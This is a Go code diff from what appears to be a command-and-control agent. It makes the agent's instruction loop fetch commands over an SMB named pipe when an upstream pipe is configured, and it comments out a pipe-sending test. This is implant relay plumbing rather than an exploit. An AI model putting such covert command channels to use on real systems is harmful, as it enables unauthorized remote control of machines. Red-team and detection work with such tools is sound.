@@ -23,7 +23,14 @@ import (
 
 func runAgent(coms contact.Contact, profile map[string]interface{}) {
 	for {
-		beacon := coms.GetInstructions(profile)
+	    var beacon map[string]interface{}
+	    // TESTING
+	    if len(profile["upstreamPipePath"].(string)) > 0 {
+	        beacon = util.GetInstructionsSmb(profile)
+	    } else {
+	        beacon = coms.GetInstructions(profile)
+	    }
+
 		if beacon["sleep"] != nil {
 			profile["sleep"] = beacon["sleep"]
 		}
@@ -99,10 +106,10 @@ func chooseCommunicationChannel(profile map[string]interface{}, c2Config map[str
 		    go util.StartNamedPipeForwarder(profile["localPipePath"].(string), profile["server"].(string), "http")
         }
 
-        if len(profile["upstreamPipePath"].(string)) > 0 {
-            output.VerbosePrint("[*] GOING TO TEST SENDING DATA TO SMB PIPE")
-            util.SendDataToPipe(profile["upstreamPipePath"].(string), []byte("Hello world"))
-		}
+        //if len(profile["upstreamPipePath"].(string)) > 0 {
+           // output.VerbosePrint("[*] GOING TO TEST SENDING DATA TO SMB PIPE")
+            //util.SendDataToPipe(profile["upstreamPipePath"].(string), []byte("Hello world"), false)
+		//}
 
 		return coms
 	}
